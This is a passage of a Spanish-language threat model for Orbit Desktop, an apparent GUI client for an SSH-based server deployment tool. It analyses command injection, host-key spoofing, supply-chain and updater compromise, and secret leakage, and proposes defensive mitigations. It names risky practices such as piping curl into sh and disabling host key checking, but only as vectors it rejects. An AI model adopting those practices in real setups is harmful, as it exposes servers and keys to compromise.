`orbit exec` sí es texto de shell por definición. Ésos son **dos modos distintos** y
tienen que serlo también en el cliente:

- `remote_command(server, argv)` — el 95 % de las llamadas. `argv` escapado elemento
  a elemento.
- `remote_shell(server, script)` — sólo para `orbit exec` y sólo desde la pantalla de
  `exec`. Documentado como «esto es una shell», con la interfaz correspondiente
  (sección 3.3).

Si las dos son la misma función con una bandera, alguien pasará la bandera por
error. Que sean dos nombres distintos es la mitad de la mitigación.

**Y una defensa en profundidad que casi nadie pone:** entre las capas 2 y 3, una
**validación de forma** para los campos que tienen forma conocida. No es el saneado
que he descartado —no reemplaza al escapado, va encima— sino un filtro de
plausibilidad que convierte un ataque en un mensaje de error legible:

| Campo | Regla | De dónde sale |
|---|---|---|
| Nombre de app | `^[a-z0-9][a-z0-9._-]{0,39}$` y sin `..` | Copiada de `_app_name_ok`, línea 1175. |
| Clave de `.env` | `^[A-Za-z_][A-Za-z0-9_]*$` | Copiada de `_env_key_ok`, línea 10957. |
| Release | `^[0-9]{8}-[0-9]{6}(-[0-9]+)?$` | Deducida del formato `%Y%m%d-%H%M%S` con sufijo `-2`, `-3`… (líneas 5256-5261). |
| Dominio | Etiquetas LDH, longitud máxima, IDN a punycode **antes** de validar | Orbit no lo hace; el cliente sí puede. |
| `--ref` | Reglas de `git check-ref-format`, o un SHA hexadecimal | Orbit no lo hace. |
| Puerto | Entero 1-65535 | |

**Por qué esto es defensa en profundidad y no la defensa.** Porque si mañana alguien
añade un campo nuevo y olvida la regla de forma, el escapado sigue protegiendo. Al
revés no: si el escapado falla, ninguna lista de caracteres prohibidos te salva —hay
demasiadas codificaciones, demasiados shells y demasiada creatividad—. El orden
importa: **escapar siempre, validar además.** Quien lo hace al revés acaba con un
filtro que crece cada vez que alguien encuentra un carácter nuevo, que es la firma de
que el diseño estaba mal.

**Lo que se descarta, y por qué:**

- **Una lista negra de caracteres.** El clásico. Falla con codificaciones, con
  caracteres Unicode que el shell remoto normaliza, con la diferencia entre `bash`,
  `dash`, `zsh` y `fish` como shell de login del usuario remoto, y con el usuario
  legítimo que necesita un `&` en un comando de `exec`. Y sobre todo: **falla en
  silencio**, que es la peor forma.
- **`ssh -T host -- orbit deploy web` creyendo que `--` separa argumentos.** No lo
  hace: OpenSSH une con espacios lo que le sobra. Verificable en un minuto y hay que
  verificarlo, porque es la creencia falsa más extendida sobre este tema.
- **Una librería SSH embebida (`libssh2`, `russh`, `ssh2` de Node) en vez del binario
  `ssh`.** Tentador porque da control del canal, y descartado por tres motivos: (a)
  perderíamos `~/.ssh/config` y con él `ProxyJump`, que el principio 3 exige y que en
  la práctica es cómo la gente llega a los servidores que no están en internet; (b)
  perderíamos la integración con el agente del sistema y con las claves en hardware
  (YubiKey, Secure Enclave, `sk-ssh-ed25519`); (c) añade una implementación de
  criptografía a nuestra superficie de auditoría y a nuestro calendario de parches, y
  este proyecto no tiene equipo de seguridad a tiempo completo —lo dice §13.3 de
  Orbit sobre sí mismo, y vale igual aquí—. **Y no resuelve el problema**: incluso con
  una librería, `sshd` sigue entregando la petición `exec` a un shell.
- **Ejecutar `orbit` mediante `sudo` con un sudoers que lo restrinja.** No es una
  mitigación de esta amenaza, es la idea del grupo `orbit-admin` del BRIEF, y el
  propio BRIEF admite que sigue siendo equivalente a root por `orbit exec`.

---

#### T-04 · Suplantación del host SSH
**Actor:** C4, y quien pueda tocar el DNS o la IP (que puede ser quien tenga A4).
**Activo:** A1 si hay reenvío de agente; si no, lo que se teclee en esa sesión.
**Severidad: Alta** en el primer contacto; **Baja** después, si se hace bien.

SSH resuelve esto con TOFU: la primera vez se acepta la clave del host y a partir de
ahí se comprueba. La pregunta interesante no es qué hace SSH, sino **qué hace una
interfaz gráfica en el momento en que aparece un host desconocido**, porque ahí es
donde los clientes gráficos suelen estropearlo.

Hay tres formas de estropearlo, y las tres están en productos que existen:

1. **Aceptar en silencio** (equivalente a `StrictHostKeyChecking=no`). Convierte el
   primer contacto en confianza ciega y, peor, **acepta también los cambios de clave**
   en algunas configuraciones. Inaceptable.
2. **Enseñar un diálogo con un botón «Aceptar» y el hash en letra pequeña.** Es lo
   habitual y es teatro: nadie compara 43 caracteres de base64 desde un móvil.
3. **Guardar los hosts en un almacén propio del cliente** en vez de en
   `~/.ssh/known_hosts`. Rompe el principio 3 —el usuario deja de tener una sola
   verdad sobre en qué servidores confía— y, en cuanto el usuario usa `ssh` desde el
   terminal, tiene dos bases de datos que discrepan.

**La política que propongo:**

- **`StrictHostKeyChecking=accept-new`, no `yes` ni `no`.** Es la opción que existe
  desde OpenSSH 7.6 y que hace exactamente lo que se necesita: acepta un host nuevo y
  **se niega en redondo si la clave de un host conocido ha cambiado**. Con `yes`, el
  primer contacto falla y el usuario acaba desactivándolo entero, que es peor;
  con `no`, no hay protección. `accept-new` es el punto donde la seguridad y lo que
  la gente hace de verdad coinciden.
- **El almacén es `~/.ssh/known_hosts`, el del sistema.** Nada propio. Si el usuario
  ya confía en un host desde su terminal, Orbit Desktop confía; y al revés.
- **El primer contacto se marca en la interfaz, no se pregunta con un botón.** La
  diferencia: en vez de un modal «¿aceptas esta huella? [Sí]», el servidor recién
  añadido aparece con un distintivo de *primera conexión* y su huella completa
  (SHA256, más el `ssh-keygen -lv` visual si cabe), con dos acciones: **«Comprobar»**,
  que explica cómo verificarla desde la consola del proveedor de VPS o por otro canal,
  y **«Confiar»**. La huella se enseña **completa y en monoespaciada**, seleccionable
  para pegar. Ninguna de las dos acciones es el botón por defecto.
- **Un cambio de clave de un host conocido es un error, no un aviso.** Pantalla
  bloqueante, texto que no minimiza el problema, y **la única salida es editar
  `~/.ssh/known_hosts` a mano fuera de la aplicación**. Deliberadamente incómodo:
  cambiar la clave de un host es raro (reinstalación, migración) y siempre lo sabe el
  usuario, mientras que un ataque de suplantación es exactamente esto y no debe tener
  un botón de «continuar».
- **Nunca `ForwardAgent` por defecto.** Reenviar el agente a un servidor le da a ese
  servidor la capacidad de usar la clave del usuario mientras la sesión está abierta
  —o sea, T-02 escalando a A1—. Orbit Desktop no lo necesita para nada: el `git fetch`
  lo hace `deploy` con **sus** credenciales en el servidor (líneas 859-870), no con
  las del usuario. Si algún día hiciera falta, va por servidor, con explicación
  explícita, y nunca global.
- **`~/.ssh/config` se respeta**, incluido `ProxyJump`. La comprobación de host se
  aplica **también al host de salto**, y eso hay que probarlo (sección 5.4): es el
  caso que se olvida.

**Lo que se descarta:** implementar la verificación de huellas dentro del cliente con
un almacén propio y una interfaz «bonita». Bonito aquí significa que hay dos verdades
sobre en qué se confía, y es el mismo error que la regla 1 prohíbe para `/etc/nginx`.
También se descarta apoyarse sólo en DNSSEC/SSHFP: casi ningún VPS lo publica.

---

#### T-05 · Cadena de suministro
**Actor:** C5. **Activo:** A9 y, por él, todos. **Severidad: Crítica.**

Un desarrollador de escritorio moderno arrastra entre 400 y 1.500 paquetes
transitivos. Cada uno es código que se ejecuta en la máquina que tiene A1. `SECURITY.md`
de Orbit ya dice de sí mismo *«Orbit no audita tus dependencias»*; en el cliente esa
frase no vale, porque en el servidor la dependencia maliciosa corre como el usuario de
la app y aquí correría como el dueño de las llaves.

Cuatro subamenazas distintas, que la gente mezcla:

**T-05a · Una dependencia comprometida en el árbol de producción.** Severidad crítica.
- Lockfile obligatorio y `--frozen-lockfile` / `--locked` en CI. Un build que resuelve
  versiones es un build que puede traer otra cosa hoy que ayer.
- `cargo audit` y `npm audit --omit=dev` (o `pnpm audit`) en cada PR, **fallando el
  build** en severidad alta o crítica.
- Presupuesto de dependencias declarado: un número máximo de paquetes de producción y
  una revisión humana cuando sube. No es burocracia: es la única métrica que hace que
  alguien piense antes de añadir una librería de tres líneas.
- Retraso deliberado en la adopción: no actualizar a una versión publicada hace menos
  de N días salvo que arregle un CVE. Los ataques de cuenta comprometida se detectan
  casi siempre en las primeras 48 horas.

**T-05b · Un script de instalación de una dependencia.** Severidad crítica y muy poco
tratada. `npm install` ejecuta `postinstall`. La mitigación es
`--ignore-scripts` por defecto en CI y en el entorno de desarrollo, con una lista
explícita y corta de los paquetes que de verdad necesitan compilarse.

**T-05c · El actualizador automático del cliente.** Severidad crítica y **es el mayor
riesgo individual de todo el producto**, porque un actualizador comprometido instala
código en todas las máquinas que tienen A1, de golpe y sin interacción.

Requisitos, sin excepciones:

- **Descarga siempre por HTTPS con verificación de certificado.** Sin `--insecure`,
  sin «modo desarrollo» que lo apague.
- **Firma criptográfica del artefacto verificada por el cliente antes de aplicar
  nada**, con la clave pública **empotrada en el binario**, no descargada. Lo segundo
  es un actualizador que confía en el mismo canal que le trae el paquete.
- **La actualización nunca es silenciosa.** Se avisa, se enseña qué cambia y el
  usuario acepta. Motivo: este cliente tiene root en producción; un cambio de
  comportamiento sin avisar en una herramienta así es en sí mismo un incidente.
- **Sin degradaciones**: rechazar una versión menor que la instalada, salvo que el
  usuario lo pida a mano. Si no, el atacante que controle el canal te sirve la versión
  vulnerable de hace ocho meses, firmada de verdad.
- **Cero código remoto**. Nada de descargar y evaluar JavaScript, ni de parches
  calientes. La actualización es un binario firmado, punto.
- **La versión del cliente se puede comprobar desde la interfaz**, y coincide con lo
  que dice el binario. Suena a nada; es lo que permite responder «¿estoy parcheado?».

**T-05d · El propio pipeline de release.** Severidad crítica. La política completa
—compromiso y rotación de la clave de firma— está escrita en §7.3b, porque escribirla es
justamente lo que faltaba. Aquí sólo el principio: **la clave de firma del actualizador
es el activo más peligroso del proyecto**, más que cualquier servidor de cualquier
usuario, porque con ella se instala código en todas las máquinas que tienen A1 a la vez.

**T-05e · La cadena de suministro del entorno de desarrollo.** Severidad crítica, y es la
que la ronda 1 de este documento reconoció que faltaba.

El razonamiento es incómodo y por eso se salta: hemos dedicado una sección entera a que
el portátil del usuario es un objetivo de primer orden porque tiene las llaves de sus
servidores. **El portátil de quien escribe Orbit Desktop tiene la llave de los portátiles
de todos los usuarios.** Es un eslabón por encima. Y el vector es el habitual del
desarrollo moderno:

- **Extensiones del editor.** Una extensión de VS Code corre sin sandbox con los permisos
  del desarrollador y se actualiza sola. Ha habido campañas reales de extensiones
  troyanizadas en los dos marketplaces grandes.
- **Dependencias de desarrollo**, que son diez veces más numerosas que las de producción y
  se auditan diez veces menos porque «no van en el binario». Van en el binario: un
  `postinstall` de una dependencia de desarrollo se ejecuta en la máquina que compila.
- **Acciones de CI de terceros** referenciadas por etiqueta (`@v4`) en vez de por SHA. La
  etiqueta se puede mover; el SHA no. Es el vector del incidente de `tj-actions` de 2025.
- **La imagen base del contenedor de build**, si se usa una.
- **El propio Rust/Node instalado con un `curl | sh`**, que es como se instala.

Mitigaciones, y hay que ser realista sobre cuáles se van a cumplir de verdad:

1. **Toda acción de CI se referencia por SHA de commit, nunca por etiqueta**, con un bot
   que actualiza los SHAs en un PR revisable. Es barato, es verificable con un `grep` en
   CI, y cierra el vector con peor relación coste/daño de la lista. **Criterio B-49.**
2. **La firma no ocurre en el mismo trabajo de CI que compila.** El artefacto se construye
   en un trabajo sin ningún secreto, se sube, y un segundo trabajo —con permisos mínimos y
   sin código de terceros más allá de la acción de firma— lo firma. Así una dependencia de
   build comprometida no toca la clave.
3. **Las dependencias de desarrollo se auditan igual que las de producción.** `npm audit`
   sin `--omit=dev` en un trabajo aparte que **no** falla el build pero sí abre un issue.
   La separación es deliberada: si falla el build, se ignora.
4. **`--ignore-scripts` también en el entorno de desarrollo**, no sólo en CI. Es la única
   de las cinco que cambia el día a día, y por eso se documenta con la lista blanca en el
   `README` de desarrollo, para que quien la desactive sepa qué está haciendo.
5. **Y una que es de higiene y no de herramientas:** las claves SSH y los tokens del
   desarrollador **no viven en la misma cuenta de sistema operativo que el entorno de
   build**, o al menos las de firma no. Se dice sabiendo que casi nadie lo hará; se escribe
   para que la decisión de no hacerlo sea consciente.

**Y lo que no se puede prometer, dicho aquí y repetido en `SECURITY.md`:** un equipo
pequeño no detecta un compromiso dirigido de su propio entorno de desarrollo. Lo que puede
hacer es que la clave de firma no esté ahí (mitigación 2) y que la rotación esté escrita
(§7.3), de forma que el día que ocurra el daño se acote en horas y no en meses.

**Builds reproducibles: lo que se puede prometer con Tauri y lo que no.** El informe de
código recomienda Tauri v2, y eso condiciona la respuesta. Con honestidad, por capas:

| Capa | ¿Reproducible? | Qué hace falta |
|---|---|---|
| El árbol de dependencias | **Sí, hoy** | `Cargo.lock` y el lockfile de npm comprometidos y verificados en CI con `--locked` / `--frozen-lockfile`. Es determinismo de *entradas*, no de bytes, y ya es la mitad del valor. |
| El binario Rust | **Casi** | `cargo build --locked` con `RUSTFLAGS="--remap-path-prefix"` para quitar las rutas absolutas del entorno, `SOURCE_DATE_EPOCH` fijado, y la misma versión exacta del toolchain vía `rust-toolchain.toml`. Con eso dos compilaciones de la misma máquina dan el mismo hash; entre máquinas distintas todavía se cuelan rutas de dependencias del sistema. |
| El paquete de la interfaz | **Sí, con trabajo** | Vite/Rollup son deterministas si se fija la versión y se apaga cualquier marca de tiempo o hash de build. Hay que comprobarlo, no suponerlo. |
| **El instalador firmado** | **No, y no puede serlo** | La firma incluye una marca de tiempo de una autoridad externa, y la notarización de Apple devuelve un ticket distinto cada vez. Dos ejecuciones del mismo pipeline **nunca** darán el mismo `.dmg` ni el mismo `.msi`. |

**Conclusión operativa, que es lo que importa:** la promesa que se puede hacer es
**«el artefacto **sin firmar** es reproducible bit a bit desde el árbol de fuentes en la
misma plataforma»**, y se publica el hash de ese artefacto intermedio junto con el
firmado. Cualquiera puede reconstruir y comparar el primero; nadie puede comparar el
segundo, y prometerlo sería mentir. Es exactamente la distinción que muchos proyectos no
hacen y que convierte «builds reproducibles» en una etiqueta sin contenido.

**Y la pregunta concreta: ¿qué pasa el día que caiga la cuenta de un mantenedor de una
dependencia?** Es la más probable de todas las de esta sección —ocurre varias veces al
año— y merece un procedimiento, no una intención:

**Antes** (lo que hace que el día sea manejable):
- **Retraso de cuarentena.** No se adopta una versión publicada hace menos de **7 días**,
  salvo que arregle un CVE que nos afecte. Casi todos los compromisos de cuenta se
  detectan y se despublican en las primeras 24-72 horas, así que la cuarentena convierte
  la mayoría de estos incidentes en un no-evento. Coste: ir siempre una semana por detrás,
  que en una app de escritorio no cuesta nada.
- **Lockfiles comprometidos y `--locked`**, para que la versión maliciosa no entre sola.
- **Presupuesto de dependencias declarado** y revisión humana cuando sube, que es lo único
  que reduce el número de cuentas de las que dependemos. Con Tauri el árbol de producción
  del frontend es pequeño por construcción (no hay Node en el renderer); es una ventaja de
  la elección de stack que conviene no gastar.
- **SBOM publicado** (§7.2), que es lo que permite contestar «¿estamos afectados?» en
  minutos en vez de en un día.

**El día:**
1. **Comprobar exposición con el SBOM**, no con la memoria. ¿Está la versión afectada en
   algún lockfile de alguna release publicada?
2. **Si nunca entró:** anotarlo, subir el pin, y no publicar nada. La mitad de las veces
   es esto, gracias a la cuarentena.
3. **Si entró y hay una release publicada con ella:** se trata como un compromiso del
   producto, no de una dependencia. Se publica un aviso en `SECURITY.md` y en las notas de
   release **antes** de tener el arreglo —la gente necesita saber si desinstalar—, se saca
   una versión con la dependencia fijada a la última buena conocida o eliminada, y se
   revisa qué podía hacer ese código: si tenía acceso al proceso que habla con el agente
   SSH, **el aviso tiene que decirle a los usuarios que roten sus claves**. Esa frase es
   la más cara del documento y por eso se escribe ahora, cuando es barata.
4. **Si el paquete comprometido participó en un build firmado**, se ejecuta además el
   procedimiento de §7.3: hay que asumir que la clave pudo verse.
5. **Post mortem escrito**, con la pregunta útil: ¿por qué dependíamos de eso?

**Lo que se descarta:** vendorizar todas las dependencias en el repositorio. Suena a
control y es lo contrario: congela los parches de seguridad, y el día que hay un CVE nadie
sabe qué versión está dentro. El SBOM más los lockfiles dan la trazabilidad sin el coste.

**Lo que se descarta (del actualizador):** no tener actualizador y confiar en que la gente
baje la versión nueva. Suena más seguro y es peor: en un producto que administra
servidores de producción, una versión vieja durante meses es la vulnerabilidad. La
respuesta correcta no es quitar el actualizador, es hacerlo bien.

---

#### T-06 · Filtración de secretos por la propia interfaz
**Actores:** C7 principalmente, y C1 de rebote. **Activos:** A3, A4, A5, A8.
**Severidad: Alta.**

Ésta es la amenaza que Orbit-el-servidor ya vio venir y sobre la que dejó escrita la
mitad de la respuesta. §13.2, textual: *«un panel que enseñe el `.env` entero es un
panel que filtra la contraseña de la base de datos en la primera captura de pantalla
que alguien pegue en un issue»*. Y el comentario dentro del código, líneas 11266-11270,
lo repite para el JSON.

Orbit cumplió su parte: `env list` da nombres (líneas 11274-11285), `env get` da un
valor y lo da pelado. **La parte que falta es del cliente**, y son cinco canales, no
uno.

**Canal 1 · La pantalla.** El `.env` nunca se pinta entero. La pantalla de variables
es la lista de nombres de `env list --json` con el valor **oculto**, y cada valor se
revela de uno en uno, con un gesto explícito, que dispara **un `orbit env get` de
verdad** —o sea, el mismo acto deliberado que §13.2 exige, con la misma latencia—.
Consecuencias que hay que aceptar y que son buenas:

- El valor revelado se **vuelve a ocultar solo** a los 30 segundos, o al cambiar de
  pantalla, o al perder el foco la ventana. Se descarta el «mostrar todo».
- El valor revelado **nunca se escribe en disco**, ni en caché, ni en el estado
  serializado de la interfaz, ni en un `localStorage`.
- Hay un **modo presentación** —un interruptor visible— que oculta valores, dominios
  y hostnames de golpe. Para la videollamada compartida. Es la mitigación más barata
  de todo el documento y la que más veces salva el día.

**Canal 2 · El portapapeles y las capturas de pantalla.** La ronda 1 de este documento
decía «se prueba, no se supone» y a continuación escribía lo que debería pasar. Aquí está
lo que de verdad hace cada plataforma, porque **media promesa en este canal es peor que
ninguna**: un usuario que cree que su secreto se borró del portapapeles y no se borró está
peor que uno que sabe que sigue ahí.

**El portapapeles, plataforma por plataforma.**

| Plataforma | Marcar el contenido como sensible | Borrado por temporizador | Qué se puede prometer |
|---|---|---|---|
| **macOS** | **Sí, de verdad.** `NSPasteboard` acepta el tipo `org.nspasteboard.ConcealedType` (convención de la comunidad, respetada por los gestores de portapapeles serios: Alfred, Raycast, Maccy, Paste). Además, desde macOS 15, cualquier lectura del portapapeles por otra app pide permiso al usuario. | Sí, sobrescribiendo si el contenido sigue siendo el nuestro. | **Bueno.** Se puede decir «los gestores de portapapeles que respetan la convención no lo guardarán». No «ningún gestor lo guardará». |
| **Windows** | **Sí.** El formato `ExcludeClipboardContentFromMonitorProcessing` y `CanIncludeInClipboardHistory=0` / `CanUploadToCloudClipboard=0` sacan el contenido del historial de portapapeles (Win+V) y de la sincronización en la nube. Es API documentada y la respetan el propio Windows y los gestores que usan `IDataObject`. | Sí. | **Bueno**, con la misma reserva: un gestor de terceros que lea el portapapeles a pelo lo verá igual. |
| **Linux / X11** | **No hay nada.** X11 no tiene concepto de contenido sensible y **cualquier cliente conectado al servidor X puede leer el portapapeles y los eventos de teclado en cualquier momento**. Es un problema del protocolo, no nuestro. | Sí, pero es cosmético. | **Casi nada.** Hay que decirlo. |
| **Linux / Wayland** | **No hay marca de sensible, pero el modelo es mucho mejor**: sólo la ventana con el foco puede leer el portapapeles, y el acceso pasa por el compositor. | Sí. Y aquí hay una trampa real: en Wayland, y también en X11 con muchos toolkits, **el portapapeles lo sirve el proceso propietario**. Si la aplicación se cierra, el contenido desaparece — o lo conserva un gestor si hay uno. Que «se borre» al cerrar la app no es una garantía nuestra: depende del compositor y de si hay gestor. | **Medio.** Se puede prometer el borrado por temporizador mientras la app viva; no se puede prometer nada sobre lo que haya hecho un gestor. |

**Lo que se promete en la interfaz, en consecuencia**, y es una frase distinta por
plataforma o ninguna frase:

- El botón dice **«Copiar»**, y debajo, sólo cuando se ha copiado: **«se borrará del
  portapapeles en 45 s»**, con la cuenta atrás visible. Eso es cierto en las cuatro.
- **No se promete que nadie más lo lea.** En macOS y Windows se aplica la marca de
  sensible porque es gratis y ayuda; **no se menciona en la interfaz**, porque explicar
  «los gestores que respeten una convención no lo guardarán» en un tooltip es peor que
  callarse. Va en la documentación.
- **En X11 se avisa una vez**, en la primera copia de un secreto de la sesión: «en X11
  cualquier aplicación puede leer el portapapeles». Es incómodo y es verdad, y el usuario
  que administra servidores es exactamente el que puede hacer algo con ese dato (usar
  Wayland, o no copiar).

**La exclusión de captura de pantalla.**

| Plataforma | API | Qué hace de verdad | Qué NO hace |
|---|---|---|---|
| **macOS** | `NSWindow.sharingType = .none` | La ventana sale **en negro** en compartición de pantalla, grabación de QuickTime y capturas de terceros que usan las APIs normales. | No impide `Cmd+Shift+4` en versiones recientes de forma fiable, no impide una foto con el móvil, y **no impide la captura por accesibilidad**. |
| **Windows** | `SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)` | La ventana desaparece de la captura (Win 10 2004+): el que graba ve lo que hay detrás. Funciona con la captura del sistema, Teams, OBS. | Requiere composición de escritorio; con ciertos drivers y en sesiones RDP degradadas puede no aplicarse **en silencio**. Y tampoco impide una foto. |
| **Linux** | **No existe.** Ni en X11 ni en Wayland hay una forma portable de decir «no captures esta ventana». Wayland tiene el portal de captura, que pide permiso al usuario, pero no exclusión por ventana. | — | — |

**Lo que se promete, en consecuencia:**

- La exclusión se aplica **sólo al panel del valor revelado**, no a la ventana entera. Dos
  motivos: excluir toda la app rompe las capturas legítimas de soporte —y la gente
  desactivaría la función—, y en macOS `sharingType` es por ventana, así que técnicamente
  encaja con un panel flotante y no con una región de la ventana principal. **Eso obliga a
  que el valor revelado viva en su propia ventana**, no en un `div` dentro de la principal.
  Es una consecuencia de diseño que sale de una limitación de plataforma y hay que
  escribirla ahora, no descubrirla implementando.
- **En Linux no se promete nada**, y el modo presentación (D-03) pasa de ser un extra a ser
  **la mitigación principal en esa plataforma**. Eso reordena su prioridad: deja de ser
  deseable y pasa a bloqueante en Linux.
- **En ninguna plataforma se promete protección contra una foto**, y la interfaz no insinúa
  lo contrario con un icono de candado. Lo único que de verdad protege es que el valor esté
  oculto por defecto y se vuelva a ocultar solo (SEC-13), que es la mitigación que funciona
  igual en las tres plataformas.

**La regla que queda, y vale para todo el documento:** una mitigación que sólo funciona en
dos de las tres plataformas no es una mitigación del producto, es una mejora de esas dos.
Se implementa donde funciona, se mide en las tres (§5.5, prueba 4), y **la promesa que se
escribe en la interfaz es la del peor caso**, no la del mejor.

**Canal 3 · La telemetría.** La regla es dura y es fácil de verificar:

> **La telemetría nunca contiene nombres de dominio, nombres de app, hostnames, IPs,
> nombres de usuario, rutas de fichero ni ninguna cadena procedente del servidor.**

Lo que sí puede contener: versión del cliente, sistema operativo, qué pantalla se
abrió, cuánto tardó un comando, un identificador de error estable, y la versión de
Orbit y de contrato del servidor (`orbit version --json`, línea 12022, devuelve
`{"schema":1,"version":"1.3.6","contract":1}` — eso son dos números, no un dato
personal). Y **es opcional, apagada por defecto, y con una pantalla que enseña
literalmente lo que se envía**, no una descripción de lo que se envía.

Por qué tan estricto: los nombres de dominio de un cliente de agencia **son** su
cartera de clientes. Un endpoint de telemetría que los recoge es una base de datos de
quién aloja qué, en manos de un proveedor de escritorio. Y `orbit traffic` (§13.8)
maneja IPs de visitantes, o sea datos personales de terceros que ni siquiera son
usuarios nuestros.

**Canal 4 · Los logs de errores y los informes de fallo.** El canal por el que se
escapa todo, siempre, en todos los productos. Reglas:

- El log local del cliente registra **qué comando se ejecutó, no con qué argumentos
  sensibles**. Es exactamente lo que hace Orbit: línea 9024, `logline "exec $name"`,
  con el comentario *«un comando puede llevar una contraseña delante y el log no es
  sitio para secretos»*. Se hereda tal cual.
- El informe de fallo **no se envía solo**. Se genera, se enseña **completo** al
  usuario en una ventana de texto editable, y el usuario decide.
- La captura de excepciones no serializa el objeto de contexto entero. Un
  `catch (e) { report(e, {app, server, response}) }` manda el `.env` el día que la
  excepción salta dentro de la pantalla de variables. Se declara qué campos van, en
  una lista blanca.
- **Redacción por patrón como última red**, no como primera: buscar en el texto del
  informe cualquier valor que el proceso haya obtenido con `env get` en esta sesión y
  sustituirlo. Es una red de seguridad, no la política.

**Canal 5 · El histórico y el autocompletado.** La pantalla de `orbit exec` va a tener
un histórico de comandos, porque sin él no se usa. Y la gente escribe
`psql "postgresql://usuario:contraseña@…"` en esa caja. El histórico **se guarda en
memoria por sesión y no en disco**, salvo que el usuario active explícitamente lo
contrario, y en ese caso se avisa de lo que implica. Es la misma decisión que tomó
`bash` con `HISTCONTROL=ignorespace`, sólo que con el valor por defecto al revés,
porque aquí el ratio de comandos con secretos es mucho más alto.

---

#### T-07 · Ejecutar contra el servidor equivocado
**Actores:** el usuario, C6. **Activo:** A2. **Severidad: Alta.**

No es un ataque, es un accidente, y en un cliente multiservidor es **el accidente**.
El principio 5 del BRIEF dice que multiservidor «sale gratis»; sale gratis en
arquitectura y cuesta caro en interfaz. `orbit remove tienda --purge` contra el
servidor de pruebas y contra el de producción son la misma pantalla con un
desplegable distinto.

Y hay precedente en el propio repositorio, contado en `ARCHITECTURE.md` §11.1 y en
`DEVELOPMENT.md`: la suite de pruebas, ejecutada como root en un servidor que tenía
una app llamada `tienda`, **borró el vhost de la app de verdad**. 32 suites en verde,
2.512 comprobaciones, 0 fallos, y una web muerta. Ese incidente no fue de seguridad;
fue exactamente esto: una operación correcta contra el objetivo equivocado.

Mitigaciones:

- **El servidor activo está siempre visible**, no en un desplegable que se lee al
  entrar. Nombre y color asignado por el usuario, presentes en la ventana entera.
- **Los servidores marcados como producción se marcan de verdad**: color propio,
  distintivo en la barra, y confirmación reforzada para las tres operaciones
  peligrosas (sección 3).
- **Ninguna operación destructiva se ejecuta contra el servidor "actual" implícito.**
  La confirmación nombra el servidor **y** la app, y el usuario escribe el nombre de
  la app —ver §3.1—.
- Y la regla más útil, sacada del incidente de §11.1: **el nombre de la app no
  identifica nada por sí solo.** `tienda` existe en tres servidores. Todo lo que se
  registre, se confirme o se anuncie va como `servidor:app`, nunca como `app`.

---

#### T-08 · El agente SSH y las claves sin frase de paso
**Actores:** C1, C2. **Activo:** A1. **Severidad: Alta.**

Una clave sin frase de paso en `~/.ssh/id_ed25519` es acceso root a producción para
cualquier proceso que lea el fichero. Es tan común que casi no se menciona.

Orbit Desktop no puede arreglarlo, pero puede **verlo y decirlo**: al añadir un
servidor, si la clave configurada no está cifrada, la interfaz lo señala como un
riesgo con una explicación corta y un enlace a cómo ponerle frase de paso
(`ssh-keygen -p`). Sin bloquear, sin regañar, y **una vez**, no en cada arranque: un
aviso que sale siempre se aprende a ignorar, y entonces se ignoran también los que
importan. Es la misma lógica de §13.1 sobre `null` frente a `stopped`: *confundir «no
aplica» con «está caída» enseña a la gente a ignorar las alarmas*.

Y lo simétrico: **Orbit Desktop nunca pide la frase de paso de una clave.** Delega en
`ssh-agent`, en el llavero del sistema (`ssh-add --apple-use-keychain` en macOS) o en
el `ssh` del sistema, que ya sabe pedirla. Un campo «frase de paso» dentro de nuestra
ventana es una invitación a que la guardemos, y a que un día alguien la guarde.

---

#### T-09 · Un servidor que responde despacio, a medias, o nunca
**Actor:** C3, pero también la vida real (red mala, servidor cargado, `orbit top`
que tarda un segundo a propósito). **Severidad: Media**, y **Alta** cuando lleva al
cliente a mentir.

El riesgo aquí no es la caída: es **lo que el cliente pinta mientras no sabe**. Y
hay un precedente exacto y documentado en el que apoyarse, §13.6bb: confundir
`unchanged` con `unreachable` hizo que un remoto caído se anunciara como «nada que
hacer» cada cinco minutos. El contrato de `deploy --all` tiene seis finales
justamente para que un cliente no pueda repetirlo.

La regla que sale de ahí, y que es de seguridad además de ser de calidad:

> **Un dato que no se ha podido obtener no se pinta como un valor. Se pinta como que
> no se sabe.**

Un servidor inalcanzable no se pinta con los datos de hace diez minutos sin decirlo.
Un `cpu_percent: null` no se pinta como 0 %, porque §13.6 explica que *«inventar un
cero sería mentir, porque un cero es una afirmación»*. Un `complete: false` de
`orbit traffic` se pinta como ventana recortada, no como un número más pequeño.

Es de seguridad porque un panel que dice «todo verde» cuando en realidad no ha
podido preguntar es un panel que oculta un incidente en curso.

---

#### T-10 · Una conexión que se corta a mitad de un despliegue
**Actor:** la red. **Severidad: Media** para los datos, **Alta** para la confianza.

El caso: `orbit deploy` corriendo, tres minutos de build, y el portátil cambia de
wifi. El cliente pierde la conexión. **El despliegue sigue en el servidor**, porque
`sshd` puede matar el proceso o no según cómo se cierre, y en cualquier caso el
cliente ya no sabe qué pasó.

Lo importante es lo que el cliente **no** debe hacer:

- **No debe decir que falló.** No lo sabe. Debe decir «he perdido el contacto durante
  el despliegue; el estado es desconocido», que es una frase incómoda y verdadera.
- **No debe reintentar solo.** Un `deploy` reintentado sobre uno en curso es, en el
  mejor caso, dos releases; en el peor, dos builds compitiendo por la caché de git.
- **Debe ofrecer la forma de averiguarlo**: `orbit info <app> --json` da `releases` y
  `state.last_deploy`, que es exactamente cómo se sabe si aquello terminó.

Y una decisión de diseño que hay que tomar ahora y no después: **el despliegue se
lanza de forma que sobreviva a la desconexión**, o no. Recomiendo que sí, y que la
forma sea la sencilla —no un `nohup` inventado por nosotros, que sería estado nuevo
en el servidor y rompe el principio 2, sino aceptar que si se corta se corta— y que la
interfaz sea honesta al respecto. La alternativa (lanzar dentro de `screen`/`tmux`)
**instala cosas en el servidor** y está prohibida por el principio 1.

---

#### T-10b · La superficie de `ControlMaster`
**Actores:** C1 y, en un equipo, C6. **Activo:** A1 por delegación —no la clave, pero sí
lo que la clave abre—. **Severidad: Alta**, y es una superficie que el cliente **crea**,
no una que hereda.

El arquitecto ha decidido usar `ControlMaster` (informe de código §3.2), y la decisión es
correcta: sin multiplexado, cada pantalla paga un apretón de manos completo. Medido en el
banco de pruebas de la ronda 2 (`EVIDENCIA.md` E1), **el suelo de `orbit` es de 72 ms por
llamada** —`version --json` no lee ninguna app y aun así tarda eso, porque son 13.720
líneas de Bash que se parsean cada vez—, `list --json` con 40 apps cuesta 306 ms y
